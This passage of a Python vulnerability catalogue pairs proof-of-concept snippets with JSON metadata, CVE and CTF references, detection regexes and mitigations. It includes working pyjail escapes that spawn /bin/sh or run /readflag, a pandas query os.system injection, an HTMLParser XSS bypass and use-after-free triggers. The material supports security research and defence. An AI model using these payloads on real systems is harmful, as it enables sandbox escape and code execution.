      "cve_id": "CVE-2023-27043",
      "verified": true,
      "tags": [
        "email",
        "parser",
        "validation-bypass",
        "rfc2822"
      ],
      "archived_path": "sources/PROTOCOL-001/nvd.nist.gov_vuln_detail_CVE-2023-27043.md"
    }
  ],
  "related_cves": [
    "CVE-2023-27043"
  ],
  "related_issues": [
    "python/cpython#102988"
  ],
  "detection_signature": "parseaddr\\\\(\".*<.*@.*>\"\\\\)",
  "mitigation": "Use strict email validation and reject parser-confused mixed-name/address forms.",
  "confidence": "confirmed"
}
```


### `hmac.compare_digest()` — Compiler-Optimized Timing Channel (CVE-2022-48566)
**Risk**: Pure-Python implementation used non-volatile accumulator that compilers could optimize into early-exit behavior.

```python
import time, hmac
def time_compare(secret, guess):
    start = time.perf_counter()
    hmac.compare_digest(secret, guess)
    return time.perf_counter() - start
# Longer time = more bytes matched = timing oracle
```
**Ref**: CPython Issue #84968.

```json
{
  "sink_id": "STDLIB-011",
  "category": "STDLIB",
  "title": "Pure-Python hmac.compare_digest vulnerable to compiler-optimized timing leakage",
  "severity": "medium",
  "affected_versions": [
    "3.10",
    "3.11"
  ],
  "sources": [
    {
      "type": "cve",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-48566",
      "title": "CVE-2022-48566",
      "author": "NVD",
      "date": "2023-10-01",
      "cve_id": "CVE-2022-48566",
      "verified": true,
      "tags": [
        "hmac",
        "timing",
        "side-channel",
        "compare_digest"
      ],
      "archived_path": "sources/STDLIB-011/nvd.nist.gov_vuln_detail_CVE-2022-48566.md"
    }
  ],
  "related_cves": [
    "CVE-2022-48566"
  ],
  "related_issues": [
    "python/cpython#84968"
  ],
  "detection_signature": "hmac\\\\.compare_digest\\\\(",
  "mitigation": "Prefer constant-time C-backed comparisons and avoid fallback implementations susceptible to compiler rewrites.",
  "confidence": "confirmed"
}
```


### `html.parser.HTMLParser` — Comment Parsing XSS Bypass
**Risk**: Does not correctly parse HTML comments containing `--!>`. Attackers smuggle `<script>` tags past whitelist filters.

```python
from html.parser import HTMLParser
parser = HTMLParser()
parser.feed('<!--!> <h1 value="--!><script>alert(1)</script>')
# Parser sees NO start tag for <script>
```
**Ref**: CPython Issue #102555.

```json
{
  "sink_id": "PROTOCOL-002",
  "category": "PROTOCOL",
  "title": "HTMLParser comment edge case enables whitelist-filter XSS bypass",
  "severity": "medium",
  "affected_versions": [
    "3.8",
    "3.9",
    "3.10",
    "3.11"
  ],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/102555",
      "title": "CPython Issue #102555",
      "author": "python/cpython",
      "date": "2023-03-01",
      "gh_issue": "python/cpython#102555",
      "verified": true,
      "tags": [
        "html.parser",
        "xss",
        "comment",
        "filter-bypass"
      ],
      "archived_path": "sources/PROTOCOL-002/github.com_python_cpython_issues_102555.md"
    }
  ],
  "related_cves": [],
  "related_issues": [
    "python/cpython#102555"
  ],
  "detection_signature": "HTMLParser\\\\(\\\\)|--!><script>",
  "mitigation": "Do not rely on HTMLParser alone for sanitization; use a standards-compliant sanitizer.",
  "confidence": "likely"
}
```


### `configparser` — Newline Injection
**Risk**: Accepts `=` signs and newlines in section names and keys, producing files that read back differently.

```python
import configparser
cfg = configparser.ConfigParser()
cfg['section\n[evil]'] = {}
cfg['section\n[evil]']['pwned'] = 'true'
# Injects new section when written and re-read
```
**Ref**: CPython Issue #69909.

```json
{
  "sink_id": "PROTOCOL-003",
  "category": "PROTOCOL",
  "title": "configparser permits newline injection in section names and keys",
  "severity": "medium",
  "affected_versions": [
    "3.8",
    "3.9",
    "3.10",
    "3.11",
    "3.12"
  ],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/69909",
      "title": "CPython Issue #69909",
      "author": "python/cpython",
      "date": "2015-01-01",
      "gh_issue": "python/cpython#69909",
      "verified": true,
      "tags": [
        "configparser",
        "newline-injection",
        "parser-confusion",
        "config"
      ],
      "archived_path": "sources/PROTOCOL-003/github.com_python_cpython_issues_69909.md"
    }
  ],
  "related_cves": [],
  "related_issues": [
    "python/cpython#69909"
  ],
  "detection_signature": "cfg\\['.*\\n\\[.*\\]'\\]",
  "mitigation": "Reject control characters and delimiter-bearing section names before serializing configuration files.",
  "confidence": "likely"
}
```


### `statistics` Module — Integer Overflow / NaN Handling
**Risk**: `stdev()` crashes on infinity input with `AttributeError`. `fmean()` overflows where `mean()` does not.

```python
from statistics import stdev
import math
stdev([math.inf])  # AttributeError: 'float' object has no attribute 'numerator'
```
**Ref**: CPython Issue #140938.

```json
{
  "sink_id": "NUMERIC-001",
  "category": "NUMERIC",
  "title": "statistics.stdev() Infinity Handling Crash",
  "severity": "medium",
  "affected_versions": [
    "3.13+",
    "3.14+",
    "3.15+"
  ],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/140938",
      "title": "`statistics.stdev()` raises `AttributeError` when data contains infinity",
      "author": "T90REAL",
      "date": "2025-11-03",
      "verified": false,
      "tags": [
        "statistics",
        "nan",
        "overflow",
        "crash",
        "stdlib"
      ],
      "archived_path": "sources/NUMERIC-001/github.com_python_cpython_issues_140938.md"
    }
  ],
  "confidence": "confirmed"
}
```


### `memoryview` Use-After-Free for Arbitrary Memory Read/Write
**Risk**: `memoryview` can persist after backing buffer is freed. Combined with heap layout manipulation, enables write-what-where.

```python
import io
class File(io.RawIOBase):
    def readinto(self, buf):
        global view
        view = buf
        return 1
    def readable(self):
        return True

f = io.BufferedReader(File())
f.read(1)
del f
view = view.cast('P')
L = [None] * len(view)
view[0] = 0
print(L[0])  # NULL dereference
```
**Ref**: pwn.win — Exploiting a Use-After-Free for code execution in every version of Python 3.

```json
{
  "sink_id": "CPYTHON-013",
  "category": "CPYTHON",
  "title": "memoryview Dangling Buffer Use-After-Free",
  "severity": "critical",
  "affected_versions": [
    "2.7+",
    "3.6+",
    "3.7+",
    "3.8+",
    "3.9+",
    "3.10+",
    "3.11+",
    "3.12+",
    "3.13+"
  ],
  "sources": [
    {
      "type": "blog_post",
      "url": "https://pwn.win/2022/05/11/python-buffered-reader.html",
      "title": "Exploiting a Use-After-Free for code execution in every version of Python 3",
      "author": "pwn.win",
      "date": "2022-05-11",
      "verified": true,
      "tags": [
        "memoryview",
        "uaf",
        "arbitrary-read",
        "arbitrary-write",
        "sandbox-escape"
      ],
      "archived_path": "sources/CPYTHON-013/pwn.win_2022_05_11_python-buffered-reader.html.md"
    }
  ],
  "confidence": "confirmed"
}
```


### `array.__setitem__` UAF via Re-entrant `__index__`
**Risk**: Bounds check happens before `__index__()` callback, but write happens after. Malicious `__index__` clears array between check and write.

```python
import array
victim = array.array('b', [0] * 64)
class Evil:
    def __index__(self):
        victim.clear()
        return 1
victim[1] = Evil()  # SEGV
```
**Ref**: CPython Issue #142555.

```json
{
  "sink_id": "CPYTHON-014",
  "category": "CPYTHON",
  "title": "array.__setitem__ Re-entrant __index__ Use-After-Free",
  "severity": "high",
  "affected_versions": [
    "3.13+",
    "3.14+",
    "3.15+"
  ],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/142555",
      "title": "`array`: `*_setitem` functions & co may crash on re-entrant `__index__`",
      "author": "jackfromeast",
      "date": "2025-12-11",
      "verified": true,
      "tags": [
        "array",
        "uaf",
        "__index__",
        "reentrancy",
        "crash"
      ],
      "archived_path": "sources/CPYTHON-014/github.com_python_cpython_issues_142555.md"
    }
  ],
  "confidence": "confirmed"
}
```


### NumPy `numpy.load()` Arbitrary Code Execution (CVE-2019-6446)
**Risk**: Uses Python's `pickle` module internally when `allow_pickle=True`.

```python
import numpy as np
np.load('malicious.npy', allow_pickle=True)  # RCE via pickle payload
```
**Ref**: NVD CVE-2019-6446.

```json
{
  "sink_id": "DESER-004",
  "category": "DESER",
  "title": "numpy.load() Pickle-Based Arbitrary Code Execution",
  "severity": "high",
  "affected_versions": [
    "NumPy < 1.16.3",
    "Python 2.7",
    "Python 3.x"
  ],
  "sources": [
    {
      "type": "cve",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-6446",
      "title": "CVE-2019-6446",
      "author": "NVD",
      "date": "2019-01-16",
      "cve_id": "CVE-2019-6446",
      "verified": true,
      "tags": [
        "numpy",
        "pickle",
        "deserialization",
        "rce",
        "allow_pickle"
      ],
      "archived_path": "sources/DESER-004/nvd.nist.gov_vuln_detail_CVE-2019-6446.md"
    }
  ],
  "confidence": "confirmed"
}
```


### `pandas.eval()` / `DataFrame.query()` Code Injection (CVE-2024-9880)
**Risk**: `@` prefix allows referencing arbitrary variables. Combined with pandas deep module imports, leads to code execution.

```python
import pandas
from os import system
df = pandas.DataFrame({'col1': [1, 2]})
df.query('@system("whoami")')  # Direct RCE
df.query('@pandas.compat.os.system("whoami")')  # No extra imports needed
```
**Ref**: Duarte Santos, July 2024.

```json
{
  "sink_id": "RCE-004",
  "category": "RCE",
  "title": "pandas DataFrame.query() Expression Injection to Code Execution",
  "severity": "high",
  "affected_versions": [
    "pandas <= 2.2.2",
    "Python 3.x"
  ],
  "sources": [
    {
      "type": "security_advisory",
      "url": "https://github.com/pandas-dev/pandas/issues/60602",
      "title": "Question: does the project consider DataFrame.query() arbitrary code execution to be a vulnerability?",
      "author": "pandas-dev",
      "date": "2024-12-24",
      "verified": true,
      "tags": [
        "pandas",
        "query",
        "eval",
        "expression-injection",
        "rce"
      ],
      "archived_path": "sources/RCE-004/github.com_pandas-dev_pandas_issues_60602.md"
    }
  ],
  "confidence": "likely"
}
```


### Protobuf `json_format.ParseDict()` DoS via Recursion Bypass
**Risk**: `max_recursion_depth` bypassed through mutual recursion in well-known types (`Struct`/`Value`/`ListValue`).

```python
from google.protobuf import json_format, struct_pb2
nested = {"leaf": "data"}
for _ in range(500):
    nested = {"level": nested}
msg = struct_pb2.Struct()
json_format.ParseDict(nested, msg, max_recursion_depth=10)  # RecursionError
```
**Ref**: Protobuf Issue #26432.

```json
{
  "sink_id": "PROTOCOL-004",
  "category": "PROTOCOL",
  "title": "protobuf json_format.ParseDict() Recursion Limit Bypass",
  "severity": "medium",
  "affected_versions": [
    "protobuf-python 6.x",
    "Python 3.x"
  ],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/protocolbuffers/protobuf/issues/26432",
      "title": "json_format.ParseDict() DoS via recursion-depth bypass in Struct/Value/ListValue",
      "author": "protocolbuffers/protobuf",
      "date": "2025-01-01",
      "verified": false,
      "tags": [
        "protobuf",
        "json",
        "recursion",
        "dos",
        "parser"
      ],
      "archived_path": "sources/PROTOCOL-004/github.com_protocolbuffers_protobuf_issues_26432.md"
    }
  ],
  "confidence": "likely"
}
```


### `__index__` Re-entrant UAF in `memoryview` Slicing
**Risk**: `memory_subscript()` creates new view before parsing slice indices. `__index__` releasing buffer leaves dangling pointer.

```python
import mmap, os, tempfile
fd, path = tempfile.mkstemp()
os.write(fd, b"A" * 4096)
mm = mmap.mmap(fd, 4096, access=mmap.ACCESS_WRITE)
mv = memoryview(mm)

class Trigger:
    def __index__(self):
        mv.release()
        os.ftruncate(fd, 0)
        return 0

sub = mv[slice(Trigger(), None, None)]
sub[0]  # UAF crash
```
**Ref**: CPython Issue #142665.

```json
{
  "sink_id": "CPYTHON-015",
  "category": "CPYTHON",
  "title": "memoryview Slice Index Re-entrancy Use-After-Free",
  "severity": "high",
  "affected_versions": [
    "3.9+",
    "3.10+",
    "3.11+",
    "3.12+",
    "3.13+",
    "3.14+",
    "3.15+"
  ],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/142665",
      "title": "Use-after-free in `memoryview` slicing via re-entrant `__index__`",
      "author": "jackfromeast",
      "date": "2025-12-13",
      "verified": true,
      "tags": [
        "memoryview",
        "uaf",
        "slicing",
        "__index__",
        "reentrancy"
      ],
      "archived_path": "sources/CPYTHON-015/github.com_python_cpython_issues_142665.md"
    }
  ],
  "confidence": "confirmed"
}
```


### `bytearray.find()` / `.index()` UAF via Re-entrant `__index__`
**Risk**: `bytearray.index(x)` converts `x` to single byte using `__index__` before search. Crafted `__index__` calls `bytearray.clear()`, freeing buffer after `str` captured.

```python
victim = bytearray(b'A')
class Evil:
    def __index__(self):
        victim.clear()
        return 65
victim.index(Evil())  # heap UAF
```
**Ref**: CPython Issue #142560.

```json
{
  "sink_id": "CPYTHON-016",
  "category": "CPYTHON",
  "title": "bytearray.index() Re-entrant __index__ Use-After-Free",
  "severity": "high",
  "affected_versions": [
    "3.13+",
    "3.14+",
    "3.15+"
  ],
  "sources": [
    {
      "type": "github_issue",
      "url": "https://github.com/python/cpython/issues/142560",
      "title": "`bytearray.find/index` may crash on re-entrant `__index__`",
      "author": "jackfromeast",
      "date": "2025-12-11",
      "verified": true,
      "tags": [
        "bytearray",
        "uaf",
        "__index__",
        "reentrancy",
        "crash"
      ],
      "archived_path": "sources/CPYTHON-016/github.com_python_cpython_issues_142560.md"
    }
  ],
  "confidence": "confirmed"
}
```


### `_posixsubprocess.fork_exec` Direct Syscall
**Risk**: When `sys.modules` is cleared, `_posixsubprocess` module still has direct syscall access.

```python
import_ = ().__class__.__base__.__subclasses__()[84].load_module
_posixsubprocess = import_("_posixsubprocess")
pipe = ().__class__.__base__.__subclasses__()[133].__init__.__globals__['pipe']
_posixsubprocess.fork_exec([b"/readflag"], [b"/readflag"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(pipe()), False, False, None, None, None, -1, None)
```
**Ref**: HXP CTF 2021 "audited2".

```json
{
  "sink_id": "STDLIB-012",
  "category": "STDLIB",
  "title": "_posixsubprocess.fork_exec Sandbox Escape Primitive",
  "severity": "high",
  "affected_versions": [
    "3.x on POSIX"
  ],
  "sources": [
    {
      "type": "ctf_writeup",
      "url": "https://ctftime.org/task/15647",
      "title": "hxp CTF 2021 - audited2",
      "author": "CTFtime",
      "date": "2021-12-27",
      "verified": false,
      "tags": [
        "pyjail",
        "_posixsubprocess",
        "fork_exec",
        "sandbox-escape",
        "ctf"
      ],
      "archived_path": "sources/STDLIB-012/ctftime.org_task_15647.md"
    }
  ],
  "confidence": "likely"
}
```


### `string.Formatter.get_field` Arbitrary Getattr
**Risk**: `string.Formatter.get_field` uses unrestricted `getattr` internally, bypassing `safer_getattr` in RestrictedPython.

```python
import string
string.Formatter().get_field("a.__class__.__base__.__subclasses__", [], {"a": ""})[0]()[84].load_module("os").system("sh")
```
**Ref**: UIUCTF 2023 "Rattler Read".

```json
{
  "sink_id": "STDLIB-013",
  "category": "STDLIB",
  "title": "string.Formatter.get_field() Unrestricted Attribute Traversal",
  "severity": "high",
  "affected_versions": [
    "3.x"
  ],
  "sources": [
    {
      "type": "ctf_writeup",
      "url": "https://ctftime.org/task/25562",
      "title": "UIUCTF 2023 - Rattler Read",
      "author": "CTFtime",
      "date": "2023-07-03",
      "verified": false,
      "tags": [
        "string.Formatter",
        "get_field",
        "attribute-traversal",
        "restrictedpython",
        "ctf"
      ],
      "archived_path": "sources/STDLIB-013/ctftime.org_task_25562.md"
    }
  ],
  "confidence": "likely"
}
```


### `antigravity` Browser Hijacking
**Risk**: `antigravity` module imports `webbrowser` which checks `os.environ["BROWSER"]` for command execution.

```python
__import__('antigravity',
    setattr(__import__('os'),'environ',
        dict(BROWSER='/bin/sh -c "/readflag giveflag" #%s'))
)
```
**Ref**: idek 2022 Pyjail Revenge.

```json
{
  "sink_id": "STDLIB-014",
  "category": "STDLIB",
  "title": "antigravity Import Triggers webbrowser Command Execution",
  "severity": "high",
  "affected_versions": [
    "3.x"
  ],
  "sources": [
    {
      "type": "ctf_writeup",
      "url": "https://crazymanarmy.github.io/2023/01/18/idek-2022-CTF-Pyjail-Pyjail-Revenge-Writeup/",
      "title": "idek 2022 CTF: Pyjail & Pyjail Revenge Writeup",
      "author": "crazymanarmy",
      "date": "2023-01-18",
      "verified": true,
      "tags": [
        "antigravity",
        "webbrowser",
        "BROWSER",
        "sandbox-escape",
        "pyjail"
      ],
      "archived_path": "sources/CTF-008/crazymanarmy.github.io_2023_01_18_idek-2022-CTF-Pyjail-Pyjail-Revenge-Wri.md"
    }
  ],
  "confidence": "confirmed"
}
```


### Format String Attribute Traversal (No Eval)
**Risk**: Flask's `str.format()` allows attribute traversal on passed objects.

```python
# In Python jail
{a.__init__.__globals__[flag]}
# Response leaks flag variable
```
**Ref**: ImaginaryCTF 2021 "Formatting".

```json
{
  "sink_id": "SSTI-002",
  "category": "SSTI",
  "title": "str.format() Attribute Traversal Information Disclosure",
  "severity": "medium",
  "affected_versions": [
    "2.7",
    "3.x"
  ],
  "sources": [
    {
      "type": "ctf_writeup",
      "url": "https://ctftime.org/task/16059",
      "title": "ImaginaryCTF 2021 - Formatting",
      "author": "CTFtime",
      "date": "2021-07-25",
      "verified": false,
      "tags": [
        "format",
        "attribute-traversal",
        "infoleak",
        "flask",
        "ctf"
      ],
      "archived_path": "sources/SSTI-002/ctftime.org_task_16059.md"
    }
  ],
  "confidence": "likely"
}
```


### RestrictedPython Format Bypass
**Risk**: `str.format()` and `str.format_map()` allow recursive attribute lookup even in RestrictedPython.

```python
"{0.__class__.__init__.__globals__}".format(some_object)
string.Formatter().get_field("a.secret", [], {"a": obj})
```
**Ref**: zopefoundation/RestrictedPython GHSA-xjw2-6jm9-rf67.

```json
{
  "sink_id": "SSTI-003",
  "category": "SSTI",
  "title": "RestrictedPython format()/format_map() Attribute Traversal Bypass",
  "severity": "high",
  "affected_versions": [
    "RestrictedPython < 6.2",
    "Python 3.x"
  ],
  "sources": [
    {
      "type": "github_advisory",
      "url": "https://github.com/advisories/GHSA-xjw2-6jm9-rf67",
      "title": "RestrictedPython allows breakout with string formatting",
      "author": "GitHub Advisory Database",
      "date": "2023-08-28",
      "ghsa": "GHSA-xjw2-6jm9-rf67",
      "verified": true,
      "tags": [
        "restrictedpython",
        "format",
        "sandbox-escape",
        "attribute-traversal",
        "ghsa"
      ],
      "archived_path": "sources/SSTI-003/github.com_advisories_GHSA-xjw2-6jm9-rf67.md"
    }
  ],
  "confidence": "confirmed"
}
```


### `/proc/self/mem` Function Pointer Patching (PlaidCTF 2014)
**Risk**: Python `file` objects expose `/proc/self/mem` — direct window into process memory. Function pointers in Python object descriptor tables can be overwritten.

```python
[(fd.seek(0x0088af88),
  fd.write("\x40\x5f\x52"),
  fd.flush(),
  fd.readlines("/bin/sh", ["/bin/sh"]))
 for fd in (().__class__.__bases__[0].__subclasses__()[40]("/proc/self/mem", "w"),)]
```
**Ref**: fail0verflow — PlaidCTF 2014 `__nightmares__`.

```json
{
  "sink_id": "CTF-011",
  "category": "CTF",
  "title": "/proc/self/mem Object Table Patching for Code Execution",
  "severity": "critical",
  "affected_versions": [
    "2.7",
    "3.x on Linux"
  ],
  "sources": [
    {
      "type": "ctf_writeup",
      "url": "https://fail0verflow.com/blog/2014/plaidctf-2014-nightmares/",
      "title": "PlaidCTF 2014: __nightmares__",
      "author": "fail0verflow",
      "date": "2014-04-14",
      "verified": true,
      "tags": [
        "procfs",
        "memory-write",
        "function-pointer",
        "sandbox-escape",
        "pyjail"
      ],
      "archived_path": "sources/CTF-011/fail0verflow.com_blog_2014_plaidctf-2014-nightmares.md"
    }
  ],
  "confidence": "confirmed"
}
```


### `sys.path` Modification + File Write
**Risk**: Overwrite `sys.path` to writable location, write payload file, import and execute.

```python
setattr(__import__("sys"), "path", list(("/dev/shm/",)))
print("import os" + chr(10) + "os.system('/readflag')", file=open("/dev/shm/exp.py", "w"))
__import__("exp")
```
**Ref**: idek 2022 Pyjail Revenge Method 2.

```json
{
  "sink_id": "FILE-008",
  "category": "FILE",
  "title": "sys.path Redirection Plus Writable Module Drop",
  "severity": "high",
  "affected_versions": [
    "3.x"
  ],
  "sources": [
    {
      "type": "ctf_writeup",
      "url": "https://crazymanarmy.github.io/2023/01/18/idek-2022-CTF-Pyjail-Pyjail-Revenge-Writeup/",
      "title": "idek 2022 CTF: Pyjail & Pyjail Revenge Writeup",
      "author": "crazymanarmy",
      "date": "2023-01-18",
      "verified": true,
      "tags": [
        "sys.path",
        "file-write",
        "import",
        "module-drop",
        "pyjail"
      ],
      "archived_path": "sources/CTF-008/crazymanarmy.github.io_2023_01_18_idek-2022-CTF-Pyjail-Pyjail-Revenge-Wri.md"
    }
  ],
  "confidence": "confirmed"
}
```


### `func_code.co_consts` — Reading Constants from Restricted Functions
**Risk**: `func_code` exposes all constants used inside a function, including hidden flag strings.

```python
>>> exit.func_code.co_consts
(None, 'flag-THE_FLAG', -1, 'cat .passwd', 'You cannot escape !')
>>> exit(exit.func_code.co_consts[1])
Well done flag : flag-THE_REAL_FLAG
```
**Ref**: lbarman.ch — Escaping the PyJail.

```json
{
  "sink_id": "CTF-012",
  "category": "CTF",
  "title": "func_code.co_consts Secret Extraction Primitive",
  "severity": "medium",
  "affected_versions": [
    "2.7"
  ],
  "sources": [
    {
      "type": "blog_post",
      "url": "https://lbarman.ch/blog/pyjail/",
      "title": "Escaping the PyJail",
      "author": "lbarman",
      "date": "2016-09-04",
      "verified": false,
      "tags": [
        "func_code",
        "co_consts",
        "infoleak",
        "pyjail",
        "python2"
      ],
      "archived_path": "sources/CTF-012/lbarman.ch_blog_pyjail.md"
    }
  ],
  "confidence": "likely"
}
```


## Cross-Cutting Patterns

1. **Re-entrancy dominates**: Every major recent CPython bug involves `__del__`/`__eq__`/`__getattribute__` callbacks running while C code holds stale pointers.
2. **AST gaps**: Decorators, subscripts (`[]`), and augmented assignments (`+=`) compile to different AST nodes than direct calls. Sandboxes inspecting only `ast.Call` miss these paths.
3. **Free-threaded Python (3.13t)** introduces concurrency bugs unknown to mainstream Python.
4. **Type confusion at the file format level**: ZIP polyglots show that Python's file type detection (magic bytes) can be exploited.

---

## Niche Research Lanes

Use these lanes when expanding beyond common Python sinks into under-tested bug classes.

| ID | Lane | Seeds |
|----|------|-------|
| A1 | Class Confusion | `__class__.__init__.__globals__`, metaclass abuse, MRO manipulation |
| A2 | Prototype Pollution | `setattr` chains, `__globals__` traversal, pydash/pymongo variants |
| A3 | Race Conditions | `filelock` TOCTOU, `tempfile.mktemp`, `shutil.move` atomicity |
| A4 | Async/Generator | `gi_frame.f_globals`, coroutine frame escape, `asyncio.Task` UAF |
| A5 | Stdlib Hidden Sinks | `ast.literal_eval`, `ctypes` overflow, `http.server` redirect |
| A6 | CTF Tricks | Decorator AST bypass, ZIP polyglots, `breakpoint()` abuse |
| A7 | Type Confusion | `isinstance` fast-path, ABC cache corruption, `register()` bypass |
| A8 | Serialization | `memoryview` UAF, `pandas.eval()`, protobuf recursion |
| A9 | Numeric/String | `statistics.stdev()` infinity, `re` catastrophic backtracking |
| A10 | Obscure Internals | `_posixsubprocess.fork_exec`, `antigravity` hijack, `/proc/self/mem` |

---

*Last updated: 2026-04-29. Covers well-known sinks and 95 niche sinks with real CTF references, CVEs, and exploitation caveats. Synthesized from 20 parallel research subagents navigating entire blog posts, CTF writeups, and security research papers.*
